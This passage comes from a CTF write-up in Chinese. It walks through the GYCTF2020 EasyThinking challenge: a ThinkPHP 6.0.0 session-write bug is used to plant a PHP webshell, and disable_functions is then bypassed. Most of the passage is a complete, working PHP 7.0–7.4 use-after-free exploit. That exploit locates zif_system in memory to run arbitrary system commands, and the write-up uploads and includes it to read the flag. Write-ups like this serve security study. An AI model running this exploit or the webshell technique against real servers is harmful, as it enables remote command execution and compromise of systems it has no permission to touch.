class="string">&quot;key&quot;</span>]);</span><br><span class="line">            <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> View(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该函数会将key作为session中Record的值，这样就可以利用key这个可控的值来上传一句话木马</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106212749705.png" alt="image-20220106212749705"></p><p>上传后用蚁剑连接</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106213051067.png"></p><p>但是题目到这还没有结束，在根目录下找到/flag，进去后却没有flag的信息</p><p>/flag旁边有一个/readflag，大概率就是要通过它来获取flag</p><p>把key的内容换为phpinfo()，访问shell文件查看详细信息</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106232020235.png" alt="image-20220106232020235"></p><p>可以看到很多函数都被过滤掉，可以在<a href="https://github.com/mm0r1/exploits/tree/master">大佬的github</a>找到php7.0~7.4的通杀脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">//这里是想要执行的系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = unserialize(<span class="variable">$poc</span>);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把上面的exp通过蚁剑上传</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106233958835.png" alt="image-20220106233958835"></p><p>最后在search界面传递一个key=<code>&lt;?php include(&#39;/var/www/html/runtime/session/exp.php&#39;)?&gt;</code>并访问session文件，即可得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; thinkphp-v6.0.0框架漏洞+disable_functions绕过&lt;/p&gt;
&lt;p&gt;打开题目是一个简易网站，目录扫描发现在 &lt;code&gt;www.zip&lt;/code&gt; 有源码泄露，下载下来&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/01/06/GYCTF202</summary>
      
    
    
    
    
  </entry>
  
</feed>
